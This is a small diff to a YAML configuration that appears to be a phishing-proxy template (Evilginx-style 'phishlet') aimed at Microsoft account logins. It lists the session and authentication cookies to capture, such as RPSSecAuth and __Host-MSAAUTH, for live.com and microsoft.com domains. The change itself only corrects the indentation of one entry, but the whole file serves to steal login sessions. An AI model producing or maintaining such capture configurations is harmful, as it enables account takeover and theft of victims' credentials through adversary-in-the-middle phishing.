@@ -11,7 +11,7 @@ sub_filters:
 auth_tokens:
   - domain: '.live.com'
     keys: ['sid', 'WLSSC','RPSSecAuth', 'MSPOK', 'MSCC', 'OParams', 'MSPRequ', '__Host-MSAAUTH']
-    - domain: '.microsoft.com'
+  - domain: '.microsoft.com'
     keys: ['__UCIS_I', 'MS0', 'MC1', 'MSFPC', 'ai_session']
   - domain: 'privacynotice.account.microsoft.com'
     keys: ['__UCIS_I', 'MS0', 'MC1', 'MSFPC', 'ai_session']
